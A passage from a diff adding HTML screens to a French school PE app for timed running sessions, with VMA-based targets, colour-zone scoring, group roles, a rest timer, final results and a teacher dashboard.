+      <div style="font-size:20px;margin-bottom:4px;">❌</div>
+      <div style="font-weight:600;color:var(--red);">Code invalide ou session fermée</div>
+      <div style="font-size:13px;color:var(--muted);margin-top:4px;">
+        Demandez le code à votre enseignant
+      </div>
+    </div>
+
+    <button class="btn btn-primary" id="btn-join-session" onclick="validateSession()" disabled
+      style="font-size:22px;min-height:60px;">
+      Accéder →
+    </button>
+  </div>
+</div>
+
+<!-- ========================================================
+     SCREEN 3 – STUDENT PROFILE
+     ======================================================== -->
+<div class="screen" id="s-profile">
+  <div class="topbar">
+    <button class="topbar-back" onclick="showScreen('s-student-login')">‹</button>
+    <div class="topbar-title">Mon Profil</div>
+  </div>
+  <div class="screen-inner">
+    <div class="heading" style="margin-bottom:6px;">Votre profil</div>
+    <div class="subtext" style="margin-bottom:24px;">Ces informations seront utilisées pour calculer vos objectifs</div>
+
+    <div class="field">
+      <label>Prénom</label>
+      <input type="text" id="inp-firstname" placeholder="Ex: Thomas" autocomplete="off">
+    </div>
+
+    <div class="field">
+      <label>Nom de famille</label>
+      <input type="text" id="inp-lastname" placeholder="Ex: Dupont" autocomplete="off">
+    </div>
+
+    <div class="field">
+      <label>Classe</label>
+      <div class="radio-group">
+        <div class="radio-opt selected" id="opt-seconde" onclick="selectClass('Seconde')">Seconde</div>
+        <div class="radio-opt" id="opt-terminale" onclick="selectClass('Terminale')">Terminale</div>
+      </div>
+    </div>
+
+    <div class="field">
+      <label>Sexe</label>
+      <div class="radio-group">
+        <div class="radio-opt selected" id="opt-M" onclick="selectSex('M')">♂ Garçon</div>
+        <div class="radio-opt" id="opt-F" onclick="selectSex('F')">♀ Fille</div>
+      </div>
+    </div>
+
+    <div class="field">
+      <label>VMA / Plot de départ</label>
+      <div class="slider-row">
+        <input type="range" id="vma-slider" min="8" max="22" step="0.5" value="14" oninput="updateVMA(this.value)">
+        <div class="slider-val" id="vma-val">14</div>
+        <div style="font-size:14px;color:var(--muted);">km/h</div>
+      </div>
+      <div class="card" style="margin-top:10px;">
+        <div class="card-row">
+          <div>
+            <div class="label">Distance cible / course</div>
+            <div style="font-family:var(--font-d);font-size:28px;font-weight:800;color:var(--blue)" id="dist-per-run">350 m</div>
+          </div>
+          <div style="text-align:right;">
+            <div class="label">Total 3 courses</div>
+            <div style="font-family:var(--font-d);font-size:22px;font-weight:700;color:var(--muted)" id="dist-total">1050 m</div>
+          </div>
+        </div>
+        <div class="subtext" id="perf-preview">Équivalent à ≈ <strong>—</strong> pts de performance</div>
+      </div>
+    </div>
+
+    <button class="btn btn-primary" onclick="saveProfile()">Continuer →</button>
+  </div>
+</div>
+
+<!-- ========================================================
+     SCREEN 4 – GROUP SETUP
+     ======================================================== -->
+<div class="screen" id="s-group">
+  <div class="topbar">
+    <button class="topbar-back" onclick="showScreen('s-profile')">‹</button>
+    <div class="topbar-title">Groupe</div>
+    <div class="topbar-badge" id="topbar-session-badge">—</div>
+  </div>
+  <div class="screen-inner">
+    <div class="heading" style="margin-bottom:6px;">Votre groupe</div>
+    <div class="subtext" style="margin-bottom:20px;">Créez ou rejoignez un groupe de 2 ou 3 élèves</div>
+
+    <div class="tabs">
+      <button class="tab-btn active" id="tab-create" onclick="switchGroupTab('create')">Créer un groupe</button>
+      <button class="tab-btn" id="tab-join" onclick="switchGroupTab('join')">Rejoindre</button>
+    </div>
+
+    <!-- Create group panel -->
+    <div id="panel-create">
+      <div class="field">
+        <label>Taille du groupe</label>
+        <div class="radio-group">
+          <div class="radio-opt selected" id="gs-2" onclick="selectGroupSize(2)">2 élèves</div>
+          <div class="radio-opt" id="gs-3" onclick="selectGroupSize(3)">3 élèves</div>
+        </div>
+      </div>
+      <button class="btn btn-primary" onclick="createGroup()">Créer le groupe →</button>
+    </div>
+
+    <!-- Join group panel -->
+    <div id="panel-join" style="display:none;">
+      <div class="field">
+        <label>Code du groupe</label>
+        <input type="text" id="inp-group-code" placeholder="Ex: G1234" maxlength="8" autocomplete="off"
+          style="text-transform:uppercase;letter-spacing:.1em;font-size:22px;text-align:center;">
+      </div>
+      <button class="btn btn-primary" onclick="joinGroup()">Rejoindre →</button>
+    </div>
+
+    <!-- Group created display -->
+    <div id="group-waiting" style="display:none;">
+      <div class="label" style="margin-bottom:8px;">Code de votre groupe</div>
+      <div class="group-code-display" id="group-code-show">—</div>
+      <div class="subtext" style="text-align:center;margin-bottom:20px;">Partagez ce code avec vos coéquipiers</div>
+      <div id="group-members-list"></div>
+      <div id="group-start-btn" style="margin-top:16px;display:none;">
+        <button class="btn btn-green" onclick="startGroupSession()">Commencer la session ▶</button>
+      </div>
+      <div id="waiting-msg" style="text-align:center;color:var(--muted);font-size:14px;margin-top:12px;">
+        En attente des membres…
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- ========================================================
+     SCREEN 5 – COURSE ROLE SELECTION
+     ======================================================== -->
+<div class="screen" id="s-role-select">
+  <div class="topbar">
+    <button class="topbar-back" id="role-back-btn" onclick="goBackFromRole()"
+      style="width:40px;height:40px;display:flex;align-items:center;justify-content:center;
+      background:var(--surface3);border-radius:50%;border:none;color:var(--white);cursor:pointer;font-size:20px;">‹</button>
+    <div class="topbar-title">Course <span id="topbar-course-num">1</span>/3</div>
+    <div class="topbar-badge" id="topbar-session-badge2">—</div>
+  </div>
+  <div class="screen-inner">
+    <div class="course-dots" id="course-dots-role">
+      <div class="course-dot active"></div>
+      <div class="course-dot"></div>
+      <div class="course-dot"></div>
+    </div>
+
+    <div class="heading" style="margin-bottom:4px;">Course <span id="role-course-num">1</span></div>
+    <div class="subtext" style="margin-bottom:20px;">Rôles attribués automatiquement</div>
+
+    <div id="role-members"></div>
+
+    <div style="margin-top:16px;background:var(--surface2);border:2px solid var(--blue);
+      border-radius:var(--rad-sm);padding:16px;margin-bottom:20px;text-align:center;">
+      <div class="label" style="margin-bottom:6px;">Votre rôle</div>
+      <div id="my-role-display" style="font-family:var(--font-d);font-size:24px;font-weight:800;"></div>
+    </div>
+
+    <button class="btn btn-primary" onclick="confirmRole()" id="confirm-role-btn"
+      style="font-size:20px;min-height:60px;">
+      ✓ Confirmer et continuer
+    </button>
+  </div>
+</div>
+
+<!-- ========================================================
+     SCREEN 6 – RUNNER READY (info + go signal)
+     ======================================================== -->
+<div class="screen" id="s-runner-ready">
+  <div class="topbar">
+    <div class="topbar-title">Coureur – Course <span id="rr-course-num">1</span>/3</div>
+  </div>
+  <div class="screen-inner">
+    <div class="course-dots" id="course-dots-run">
+      <div class="course-dot active"></div>
+      <div class="course-dot"></div>
+      <div class="course-dot"></div>
+    </div>
+
+    <div style="text-align:center;margin-bottom:20px;">
+      <div style="font-size:56px;margin-bottom:8px;">🏃</div>
+      <div class="heading">Prêt à courir ?</div>
+      <div class="subtext" style="margin-top:6px;">
+        Ton chronométreur lancera le départ et saisira ta zone à l'arrivée
+      </div>
+    </div>
+
+    <!-- Target info -->
+    <div class="target-circle" style="margin-bottom:20px;">
+      <div class="tc-val" id="rr-target-m">350</div>
+      <div class="tc-unit">mètres</div>
+      <div class="tc-sub">en 1:30</div>
+    </div>
+
+    <div class="metric-grid" style="margin-bottom:16px;">
+      <div class="metric-tile">
+        <div class="label">Mon plot VMA</div>
+        <div class="val" id="rr-vma">14 <span style="font-size:14px;color:var(--muted);">km/h</span></div>
+      </div>
+      <div class="metric-tile">
+        <div class="label">Durée</div>
+        <div class="val">1:30</div>
+      </div>
+    </div>
+
+    <!-- Chrono name -->
+    <div style="background:var(--surface2);border-radius:var(--rad-sm);padding:12px 16px;
+      margin-bottom:20px;text-align:center;">
+      <div class="label" style="margin-bottom:4px;">Ton chronométreur</div>
+      <div id="rr-chrono-name" style="font-family:var(--font-d);font-size:22px;font-weight:800;color:var(--green);"></div>
+      <div style="font-size:12px;color:var(--muted);margin-top:4px;">
+        gère le temps et saisit ta zone d'arrivée
+      </div>
+    </div>
+
+    <div class="card" style="margin-bottom:20px;text-align:center;">
+      <div class="label" style="margin-bottom:8px;">Barème de maîtrise</div>
+      <div style="font-size:13px;color:var(--white);line-height:1.8;">
+        <span style="color:var(--blue);font-weight:700;">🔵 Bleu = 2 pts</span> &nbsp;/&nbsp;
+        <span style="color:var(--yellow);font-weight:700;">🟡 Jaune = 1,5 pt</span> &nbsp;/&nbsp;
+        <span style="color:var(--orange);font-weight:700;">🔴 Rouge = 0,75 pt</span> &nbsp;/&nbsp;
+        <span style="color:#c0ccee;font-weight:700;">⚪ Blanc = 0,25 pt</span>
+      </div>
+    </div>
+
+    <button class="btn btn-green" onclick="runnerGoRun()" style="font-size:24px;min-height:64px;">
+      ✅ Je suis prêt !
+    </button>
+    <button class="btn btn-ghost" onclick="showScreen('s-bareme')" style="margin-top:10px;font-size:16px;">
+      📊 Voir le barème complet
+    </button>
+  </div>
+</div>
+
+<!-- ========================================================
+     SCREEN 7 – RUNNER RUNNING (pas de chrono, juste attente)
+     ======================================================== -->
+<div class="screen" id="s-race">
+  <div class="topbar">
+    <div class="topbar-title">Course <span id="race-course-badge">1</span>/3</div>
+  </div>
+  <div class="screen-inner" style="align-items:center;text-align:center;padding-top:40px;">
+
+    <div style="font-size:72px;margin-bottom:20px;">🏃</div>
+    <div class="heading" style="margin-bottom:8px;">Course en cours !</div>
+    <div class="subtext" style="margin-bottom:32px;">
+      Maintenez votre allure<br>Votre chronométreur note votre zone à l'arrivée
+    </div>
+
+    <!-- Target reminder -->
+    <div style="background:var(--blue-dim);border:1px solid #1a8cff44;border-radius:var(--rad);
+      padding:20px;width:100%;margin-bottom:24px;">
+      <div class="label" style="margin-bottom:6px;">Votre objectif</div>
+      <div style="font-family:var(--font-d);font-size:48px;font-weight:900;color:var(--blue);line-height:1;">
+        <span id="race-target-display">350</span><span style="font-size:20px;"> m</span>
+      </div>
+      <div style="font-size:13px;color:var(--muted);margin-top:4px;">en 1 minute 30 secondes</div>
+    </div>
+
+    <!-- Motivational messages -->
+    <div id="race-status-msg" style="font-family:var(--font-d);font-size:18px;font-weight:700;
+      color:var(--muted);padding:12px 0;">Bonne course ! Maintenez votre allure 💪</div>
+
+    <!-- Waiting indicator -->
+    <div style="display:flex;align-items:center;gap:10px;color:var(--muted);font-size:13px;margin-top:8px;">
+      <div class="status-dot status-active"></div>
+      En attente de la saisie de votre chronométreur…
+    </div>
+  </div>
+</div>
+
+<!-- ========================================================
+     SCREEN 8 – ZONE SELECTION (remplace la saisie de distance)
+     ======================================================== -->
+<div class="screen" id="s-distance">
+  <div class="topbar">
+    <div class="topbar-title">Zone – Course <span id="dist-course-num">1</span></div>
+  </div>
+  <div class="screen-inner">
+    <div class="heading" style="margin-bottom:4px;">Dans quelle zone ?</div>
+    <!-- Runner name shown to chrono -->
+    <div id="zone-for-runner" style="font-size:15px;font-weight:600;color:var(--green);margin-bottom:6px;"></div>
+    <div class="subtext" style="margin-bottom:6px;">Où le coureur est-il arrivé par rapport à sa ligne cible ?</div>
+    <div style="font-size:13px;color:var(--blue);font-weight:600;margin-bottom:20px;">
+      Cible : <span id="zone-target-display">350</span> m
+    </div>
+
+    <!-- Zone buttons -->
+    <div style="display:flex;flex-direction:column;gap:10px;margin-bottom:20px;">
+
+      <!-- BLEU -->
+      <button class="zone-select-btn" id="zb-blue" onclick="selectZoneBtn('blue')"
+        style="background:#1a8cff22;border:2px solid #1a8cff55;border-radius:14px;padding:16px;
+          display:flex;align-items:center;gap:14px;width:100%;cursor:pointer;">
+        <div style="width:18px;height:18px;border-radius:50%;background:var(--blue);flex-shrink:0;"></div>
+        <div style="text-align:left;flex:1;">
+          <div style="font-family:var(--font-d);font-size:20px;font-weight:800;color:var(--blue);">BLEU — Ligne exacte</div>
+          <div style="font-size:12px;color:var(--muted);">0 m d'écart · Distance = cible</div>
+        </div>
+        <div style="font-family:var(--font-d);font-size:22px;font-weight:900;color:var(--blue);">2 pts</div>
+      </button>
+
+      <!-- JAUNE + -->
+      <button class="zone-select-btn" id="zb-yellow-p" onclick="selectZoneBtn('yellow-p')"
+        style="background:#ffc94018;border:2px solid #ffc94055;border-radius:14px;padding:16px;
+          display:flex;align-items:center;gap:14px;width:100%;cursor:pointer;">
+        <div style="width:18px;height:18px;border-radius:50%;background:var(--yellow);flex-shrink:0;"></div>
+        <div style="text-align:left;flex:1;">
+          <div style="font-family:var(--font-d);font-size:20px;font-weight:800;color:var(--yellow);">JAUNE + (au-delà)</div>
+          <div style="font-size:12px;color:var(--muted);">+12,5 m · Légèrement trop vite</div>
+        </div>
+        <div style="font-family:var(--font-d);font-size:22px;font-weight:900;color:var(--yellow);">1,5 pt</div>
+      </button>
+
+      <!-- JAUNE - -->
+      <button class="zone-select-btn" id="zb-yellow-m" onclick="selectZoneBtn('yellow-m')"
+        style="background:#ffc94018;border:2px solid #ffc94055;border-radius:14px;padding:16px;
+          display:flex;align-items:center;gap:14px;width:100%;cursor:pointer;">
+        <div style="width:18px;height:18px;border-radius:50%;background:var(--yellow);flex-shrink:0;"></div>
+        <div style="text-align:left;flex:1;">
+          <div style="font-family:var(--font-d);font-size:20px;font-weight:800;color:var(--yellow);">JAUNE − (en deçà)</div>
+          <div style="font-size:12px;color:var(--muted);">−12,5 m · Légèrement trop lent</div>
+        </div>
+        <div style="font-family:var(--font-d);font-size:22px;font-weight:900;color:var(--yellow);">1,5 pt</div>
+      </button>
+
+      <!-- ROUGE + -->
+      <button class="zone-select-btn" id="zb-red-p" onclick="selectZoneBtn('red-p')"
+        style="background:#ff6a1018;border:2px solid #ff6a1055;border-radius:14px;padding:16px;
+          display:flex;align-items:center;gap:14px;width:100%;cursor:pointer;">
+        <div style="width:18px;height:18px;border-radius:50%;background:var(--orange);flex-shrink:0;"></div>
+        <div style="text-align:left;flex:1;">
+          <div style="font-family:var(--font-d);font-size:20px;font-weight:800;color:var(--orange);">ROUGE + (au-delà)</div>
+          <div style="font-size:12px;color:var(--muted);">+25 m · Trop rapide</div>
+        </div>
+        <div style="font-family:var(--font-d);font-size:22px;font-weight:900;color:var(--orange);">0,75 pt</div>
+      </button>
+
+      <!-- ROUGE - -->
+      <button class="zone-select-btn" id="zb-red-m" onclick="selectZoneBtn('red-m')"
+        style="background:#ff6a1018;border:2px solid #ff6a1055;border-radius:14px;padding:16px;
+          display:flex;align-items:center;gap:14px;width:100%;cursor:pointer;">
+        <div style="width:18px;height:18px;border-radius:50%;background:var(--orange);flex-shrink:0;"></div>
+        <div style="text-align:left;flex:1;">
+          <div style="font-family:var(--font-d);font-size:20px;font-weight:800;color:var(--orange);">ROUGE − (en deçà)</div>
+          <div style="font-size:12px;color:var(--muted);">−25 m · Trop lent</div>
+        </div>
+        <div style="font-family:var(--font-d);font-size:22px;font-weight:900;color:var(--orange);">0,75 pt</div>
+      </button>
+
+      <!-- BLANC + -->
+      <button class="zone-select-btn" id="zb-white-p" onclick="selectZoneBtn('white-p')"
+        style="background:rgba(255,255,255,.06);border:2px solid rgba(255,255,255,.15);border-radius:14px;padding:16px;
+          display:flex;align-items:center;gap:14px;width:100%;cursor:pointer;">
+        <div style="width:18px;height:18px;border-radius:50%;background:#c0ccee;flex-shrink:0;"></div>
+        <div style="text-align:left;flex:1;">
+          <div style="font-family:var(--font-d);font-size:20px;font-weight:800;color:#c0ccee;">BLANC + (au-delà)</div>
+          <div style="font-size:12px;color:var(--muted);">+37,5 m · Très en avance</div>
+        </div>
+        <div style="font-family:var(--font-d);font-size:22px;font-weight:900;color:#c0ccee;">0,25 pt</div>
+      </button>
+
+      <!-- BLANC - -->
+      <button class="zone-select-btn" id="zb-white-m" onclick="selectZoneBtn('white-m')"
+        style="background:rgba(255,255,255,.06);border:2px solid rgba(255,255,255,.15);border-radius:14px;padding:16px;
+          display:flex;align-items:center;gap:14px;width:100%;cursor:pointer;">
+        <div style="width:18px;height:18px;border-radius:50%;background:#c0ccee;flex-shrink:0;"></div>
+        <div style="text-align:left;flex:1;">
+          <div style="font-family:var(--font-d);font-size:20px;font-weight:800;color:#c0ccee;">BLANC − (en deçà)</div>
+          <div style="font-size:12px;color:var(--muted);">−37,5 m · Très en retard</div>
+        </div>
+        <div style="font-family:var(--font-d);font-size:22px;font-weight:900;color:#c0ccee;">0,25 pt</div>
+      </button>
+    </div>
+
+    <button class="btn btn-primary" id="btn-validate-zone" onclick="validateZone()" disabled
+      style="font-size:20px;min-height:56px;">
+      Valider la zone ✓
+    </button>
+  </div>
+</div>
+
+<!-- ========================================================
+     SCREEN 8b – RUNNER WAITING (while chrono enters zone)
+     ======================================================== -->
+<div class="screen" id="s-waiting-zone">
+  <div class="topbar">
+    <div class="topbar-title">Fin de course</div>
+    <div class="topbar-badge" id="wz-course-badge">Course 1</div>
+  </div>
+  <div class="screen-inner" style="align-items:center;text-align:center;padding-top:60px;">
+    <div style="font-size:64px;margin-bottom:20px;">🏁</div>
+    <div class="heading" style="margin-bottom:8px;">Course terminée !</div>
+    <div style="background:var(--surface2);border:1px solid var(--border);border-radius:var(--rad);
+      padding:20px;margin:20px 0;width:100%;">
+      <div class="label" style="margin-bottom:8px;">Votre chronométreur saisit votre zone…</div>
+      <div id="wz-chrono-name" style="font-family:var(--font-d);font-size:26px;font-weight:800;color:var(--green);"></div>
+      <div style="font-size:13px;color:var(--muted);margin-top:6px;">observe et renseigne votre arrivée</div>
+    </div>
+    <div style="display:flex;align-items:center;gap:12px;color:var(--muted);font-size:14px;">
+      <div class="spinner" style="width:24px;height:24px;border-width:2px;"></div>
+      En attente de la saisie…
+    </div>
+  </div>
+</div>
+     ======================================================== -->
+<div class="screen" id="s-judge">
+  <div class="topbar">
+    <div class="topbar-title">Chronométreur – Course <span id="judge-course-num">1</span></div>
+  </div>
+  <div class="screen-inner" style="align-items:center;text-align:center;">
+    <div class="course-dots" id="course-dots-judge">
+      <div class="course-dot active"></div>
+      <div class="course-dot"></div>
+      <div class="course-dot"></div>
+    </div>
+
+    <div class="card" style="width:100%;text-align:left;margin-bottom:20px;">
+      <div class="label" style="margin-bottom:4px;">Vous chronométrez</div>
+      <div id="judge-runner-name" style="font-family:var(--font-d);font-size:26px;font-weight:800;color:var(--blue);"></div>
+      <div id="judge-runner-target" style="font-size:14px;color:var(--muted);margin-top:4px;"></div>
+    </div>
+
+    <!-- Même anneau que le coureur -->
+    <div class="timer-ring-wrap">
+      <svg viewBox="0 0 220 220" xmlns="http://www.w3.org/2000/svg">
+        <circle class="timer-ring-bg" cx="110" cy="110" r="100"/>
+        <circle class="timer-ring-fill" id="judgeTimerRing" cx="110" cy="110" r="100"
+          stroke-dasharray="628.3" stroke-dashoffset="0"/>
+      </svg>
+      <div class="timer-center">
+        <div class="timer-display" id="judgeTimerDisplay">1:30</div>
+        <div class="timer-label" id="judge-timer-label">prêt</div>
+      </div>
+    </div>
+
+    <div style="font-family:var(--font-d);font-size:16px;font-weight:700;color:var(--muted);margin-bottom:16px;"
+      id="judge-status-msg">Appuyez sur ▶ pour lancer</div>
+
+    <div style="display:flex;gap:10px;width:100%;max-width:340px;margin-bottom:16px;">
+      <button class="btn btn-green" id="judge-start-btn" onclick="judgeStartPause()"
+        style="flex:2;font-size:20px;min-height:56px;">▶ Départ</button>
+      <button class="btn btn-secondary" onclick="judgeReset()"
+        style="flex:1;font-size:18px;min-height:56px;">↺</button>
+    </div>
+
+    <div style="background:var(--surface2);border-radius:var(--rad-sm);
+      padding:12px 24px;display:inline-flex;flex-direction:column;align-items:center;gap:4px;">
+      <div class="label">Cible du coureur</div>
+      <div style="font-family:var(--font-d);font-size:28px;font-weight:900;color:var(--blue);">
+        <span id="judge-target-display">350</span> m
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- ========================================================
+     SCREEN 11 – INTER-COURSE (between courses)
+     ======================================================== -->
+<div class="screen" id="s-inter">
+  <div class="topbar">
+    <div class="topbar-title">⏸ Récupération</div>
+  </div>
+  <div class="screen-inner" style="align-items:center;text-align:center;">
+
+    <div id="inter-result-panel" style="width:100%;margin-bottom:16px;"></div>
+
+    <!-- ── CHRONO DE REPOS (7 à 8 min) ────────────────────── -->
+    <div id="rest-timer-section" style="width:100%;margin-bottom:16px;">
+      <div style="background:var(--surface2);border:1px solid var(--border);border-radius:var(--rad);padding:16px;">
+        <div style="font-family:var(--font-d);font-size:16px;font-weight:800;margin-bottom:8px;">
+          🕐 Temps de récupération
+        </div>
+        <!-- Ring timer -->
+        <div style="position:relative;width:140px;height:140px;margin:0 auto 12px;">
+          <svg viewBox="0 0 140 140" style="position:absolute;inset:0;transform:rotate(-90deg);">
+            <circle cx="70" cy="70" r="60" fill="none" stroke="var(--surface3)" stroke-width="8"/>
+            <circle id="rest-ring" cx="70" cy="70" r="60" fill="none" stroke="var(--green)"
+              stroke-width="8" stroke-linecap="round"
+              stroke-dasharray="376.99" stroke-dashoffset="376.99"/>
+          </svg>
+          <div style="position:absolute;inset:0;display:flex;flex-direction:column;align-items:center;justify-content:center;">
+            <div id="rest-display" style="font-family:var(--font-d);font-size:36px;font-weight:900;line-height:1;">7:00</div>
+            <div style="font-size:10px;color:var(--muted);text-transform:uppercase;letter-spacing:.08em;">restant</div>
+          </div>
+        </div>
+        <div style="display:flex;gap:8px;justify-content:center;margin-bottom:8px;">
+          <button onclick="restStartPause()" id="rest-btn-start"
+            style="background:var(--green);border:none;border-radius:10px;padding:10px 20px;
+            color:#001a0d;font-family:var(--font-d);font-size:16px;font-weight:800;cursor:pointer;">
+            ▶ Démarrer
+          </button>
+          <button onclick="restReset()" id="rest-btn-reset"
+            style="background:var(--surface3);border:none;border-radius:10px;padding:10px 16px;
+            color:var(--muted);font-size:16px;cursor:pointer;">↺</button>
+        </div>
+        <!-- Choose 7 or 8 min -->
+        <div style="display:flex;gap:6px;justify-content:center;">
+          <button onclick="setRestDuration(7)" id="rest-7"
+            style="background:var(--blue-dim);border:1px solid var(--blue);border-radius:8px;
+            padding:5px 14px;color:var(--blue);font-family:var(--font-d);font-size:15px;font-weight:700;cursor:pointer;">
+            7 min
+          </button>
+          <button onclick="setRestDuration(8)" id="rest-8"
+            style="background:transparent;border:1px solid var(--border);border-radius:8px;
+            padding:5px 14px;color:var(--muted);font-family:var(--font-d);font-size:15px;font-weight:700;cursor:pointer;">
+            8 min
+          </button>
+        </div>
+      </div>
+    </div>
+
+    <!-- Previous courses recap -->
+    <div style="width:100%;margin-bottom:16px;">
+      <div class="label" style="text-align:left;margin-bottom:8px;">Courses effectuées</div>
+      <div id="inter-courses-recap"></div>
+    </div>
+
+    <!-- Score running total -->
+    <div class="card" style="width:100%;margin-bottom:16px;text-align:left;">
+      <div class="card-row">
+        <div>
+          <div class="label">Performance</div>
+          <div id="inter-perf-score" style="font-family:var(--font-d);font-size:26px;font-weight:800;">— /6</div>
+        </div>
+        <div style="text-align:right;">
+          <div class="label">Maîtrise</div>
+          <div id="inter-maitrise-score" style="font-family:var(--font-d);font-size:26px;font-weight:800;color:var(--blue);">— /6</div>
+        </div>
+      </div>
+    </div>
+
+    <!-- ── VMA PLOT CHANGE (coureur seulement) ───────────── -->
+    <div id="inter-vma-change" style="width:100%;margin-bottom:16px;background:var(--surface2);
+      border:1px solid var(--border);border-radius:var(--rad);padding:18px;text-align:left;">
+      <div style="display:flex;align-items:center;gap:8px;margin-bottom:10px;">
+        <span style="font-size:18px;">⚙️</span>
+        <div style="font-family:var(--font-d);font-size:18px;font-weight:800;">Changer mon plot VMA</div>
+      </div>
+      <div style="font-size:13px;color:var(--muted);margin-bottom:12px;">
+        Modifiez votre plot de départ pour la prochaine course
+      </div>
+      <div class="slider-row" style="margin-bottom:10px;">
+        <input type="range" id="inter-vma-slider" min="8" max="22" step="0.5" value="14"
+          oninput="interUpdateVMA(this.value)">
+        <div class="slider-val" id="inter-vma-val">14</div>
+        <div style="font-size:13px;color:var(--muted);">km/h</div>
+      </div>
+      <div style="display:flex;gap:10px;margin-bottom:10px;">
+        <div style="flex:1;background:var(--surface3);border-radius:8px;padding:10px;text-align:center;">
+          <div class="label" style="margin-bottom:2px;">Cible</div>
+          <div style="font-family:var(--font-d);font-size:22px;font-weight:800;color:var(--blue);" id="inter-vma-target">350 m</div>
+        </div>
+        <div style="flex:1;background:var(--surface3);border-radius:8px;padding:10px;text-align:center;">
+          <div class="label" style="margin-bottom:2px;">Note estimée</div>
+          <div style="font-family:var(--font-d);font-size:22px;font-weight:800;color:var(--green);" id="inter-vma-note">—</div>
+        </div>
+      </div>
+      <button class="btn btn-secondary btn-sm" onclick="applyInterVMA()" style="font-size:15px;width:100%;">
+        ✓ Confirmer ce plot
+      </button>
+    </div>
+
+    <div id="next-course-info" style="margin-bottom:16px;color:var(--muted);font-size:14px;"></div>
+
+    <button class="btn btn-primary" onclick="goNextCourse()" id="next-course-btn" style="width:100%;font-size:20px;min-height:58px;">
+      Course suivante →
+    </button>
+    <button class="btn btn-ghost" onclick="goToFinalResults()" id="finish-btn" style="width:100%;margin-top:10px;display:none;">
+      Voir mes résultats →
+    </button>
+  </div>
+</div>
+
+<!-- ========================================================
+     SCREEN 12 – FINAL RESULTS
+     ======================================================== -->
+<div class="screen" id="s-results">
+  <div class="topbar">
+    <div class="topbar-title">Mes Résultats</div>
+  </div>
+  <div class="screen-inner">
+
+    <div class="score-total">
+      <div class="t-label">Score Final</div>
+      <div><span class="t-val" id="res-total">—</span><span class="t-max">/20</span></div>
+      <div class="t-mention" id="res-mention">—</div>
+    </div>
+
+    <div class="score-grid">
+      <div class="score-tile">
+        <div class="stitle">Performance</div>
+        <div class="sval" id="res-perf">—</div>
+        <div class="smax">/6</div>
+      </div>
+      <div class="score-tile">
+        <div class="stitle">Maîtrise</div>
+        <div class="sval" id="res-maitrise">—</div>
+        <div class="smax">/6</div>
+      </div>
+      <div class="score-tile">
+        <div class="stitle">Rôle Juge</div>
+        <div class="sval" id="res-afl2">—</div>
+        <div class="smax">/4</div>
+      </div>
+      <div class="score-tile">
+        <div class="stitle">Autonomie</div>
+        <div class="sval" id="res-afl3">—</div>
+        <div class="smax">/4</div>
+      </div>
+    </div>
+
+    <div class="label" style="margin-bottom:8px;">Détail par course</div>
+    <div id="res-courses"></div>
+
+    <div id="res-judge-section" style="display:none;">
+      <div class="label" style="margin-bottom:8px;margin-top:16px;">Évaluation de votre rôle de Juge</div>
+      <div class="card" id="res-judge-card"></div>
+    </div>
+
+    <button class="btn btn-secondary" style="margin-top:20px;" onclick="showScreen('s-welcome')">
+      Terminer la session
+    </button>
+
+    <!-- Group results section -->
+    <div id="group-results-section" style="display:none;margin-top:24px;">
+      <div style="height:1px;background:var(--border);margin-bottom:20px;"></div>
+      <div style="font-family:var(--font-d);font-size:20px;font-weight:800;margin-bottom:16px;">
+        👥 Résultats du groupe
+      </div>
+      <div id="group-results-list"></div>
+    </div>
+  </div>
+</div>
+     ======================================================== -->
+<div class="screen" id="s-teacher-login">
+  <div class="topbar">
+    <button class="topbar-back" onclick="showScreen('s-welcome')">‹</button>
+    <div class="topbar-title">Enseignant</div>
+  </div>
+  <div class="screen-inner">
+    <div class="heading" style="margin-bottom:6px;">Accès enseignant</div>
+    <div class="subtext" style="margin-bottom:24px;">Entrez le code d'administration</div>
+
+    <div class="field">
+      <label>Code Admin</label>
+      <input type="password" id="inp-admin-code" placeholder="••••••"
+        autocomplete="new-password" data-lpignore="true" data-form-type="other"
+        readonly onfocus="this.removeAttribute('readonly')"
+        style="font-size:24px;letter-spacing:.2em;text-align:center;">
+    </div>
+
+    <button class="btn btn-primary" onclick="teacherLogin()">Accéder →</button>
+
+  </div>
+</div>
+
+<!-- ========================================================
+     SCREEN 14 – TEACHER DASHBOARD
+     ======================================================== -->
+<div class="screen" id="s-teacher">
+  <div class="topbar">
+    <button class="topbar-back" onclick="showScreen('s-welcome')">‹</button>
+    <div class="topbar-title">Dashboard</div>
+    <div id="teacher-live-indicator" style="display:flex;align-items:center;gap:6px;font-size:13px;">
+      <div class="status-dot status-active"></div> Live
+    </div>
+  </div>
+  <div class="screen-inner" style="padding-top:16px;">
+
+    <!-- Alerts -->
+    <div class="alert-banner hidden" id="alert-away">
+      <span class="alert-icon">⚠️</span>
+      <div id="alert-away-text">Élèves hors de l'application</div>
+    </div>
+
+    <!-- Tabs -->
+    <div class="tabs">
+      <button class="tab-btn active" id="t-tab-sessions" onclick="teacherTab('sessions')">Sessions</button>
+      <button class="tab-btn" id="t-tab-live" onclick="teacherTab('live')">Live 👁</button>
+      <button class="tab-btn" id="t-tab-results" onclick="teacherTab('results')">Résultats</button>
+    </div>
+
+    <!-- Sessions tab -->
+    <div id="t-panel-sessions">
+      <button class="btn btn-primary" onclick="showCreateSession()" style="margin-bottom:16px;">
+        + Créer une session
+      </button>
+      <div id="sessions-list">
+        <div style="font-size:14px;color:var(--muted);text-align:center;padding:20px;">
+          Aucune session créée
+        </div>
+      </div>
+    </div>
+
+    <!-- Live tab -->
+    <div id="t-panel-live" style="display:none;">
+      <div class="live-bar" id="live-stats-bar">
+        <div class="live-stat">
+          <div class="ls-val" id="live-total">0</div>
+          <div class="ls-label">Élèves</div>
+        </div>
+        <div class="live-stat">
+          <div class="ls-val" style="color:var(--green);" id="live-active">0</div>
+          <div class="ls-label">Actifs</div>
+        </div>
+        <div class="live-stat">
+          <div class="ls-val" style="color:var(--red);" id="live-away">0</div>
+          <div class="ls-label">Absents</div>
+        </div>
+        <div class="live-stat">
+          <div class="ls-val" style="color:var(--yellow);" id="live-racing">0</div>
+          <div class="ls-label">En course</div>
+        </div>
+      </div>
+      <div id="live-students-list">
+        <div style="font-size:14px;color:var(--muted);text-align:center;padding:20px;">
+          Aucun élève connecté
+        </div>
+      </div>
+    </div>
+
+    <!-- Results tab -->
+    <div id="t-panel-results" style="display:none;">
+      <div class="field">
+        <label>Filtrer par session</label>
+        <select id="sel-result-session" onchange="loadSessionResults()">
